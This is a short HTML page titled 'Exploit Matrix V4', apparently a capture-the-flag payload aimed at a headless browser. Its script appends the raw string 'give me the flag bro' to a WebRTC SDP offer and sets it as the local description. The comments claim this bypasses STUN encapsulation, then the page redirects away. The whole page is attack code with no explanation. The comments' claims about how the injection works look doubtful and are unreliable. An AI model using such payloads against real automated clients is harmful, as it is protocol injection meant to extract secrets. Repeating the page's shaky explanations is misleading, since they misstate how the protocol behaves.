<!DOCTYPE html>
<html>
<head>
    <title>Exploit Matrix V4</title>
</head>
<body>
    <h1>Reconfiguring SDP Context...</h1>
    <script>
        const pc = new RTCPeerConnection();
        
        // Open a raw data channel to force ice negotiation and packet tracking
        pc.createDataChannel("trigger");

        pc.createOffer().then(offer => {
            // Target payload string terminated cleanly with a newline byte
            const cleanTarget = "give me the flag bro\n";

            // Inject the raw payload string directly into the text boundaries of the SDP configuration 
            // This bypasses the typical STUN attribute wrapper encapsulation
            let modifiedSdp = offer.sdp;
            modifiedSdp += "\r\n" + cleanTarget;

            // Update the session state using our mutated description string
            const newOffer = new RTCSessionDescription({
                type: offer.type,
                sdp: modifiedSdp
            });

            return pc.setLocalDescription(newOffer);
        }).catch(err => console.error(err));

        // Self-terminate to keep the headless browser execution thread non-blocking
        setTimeout(() => {
            window.location.href = "about:blank";
        }, 1500);
    </script>
</body>
</html>
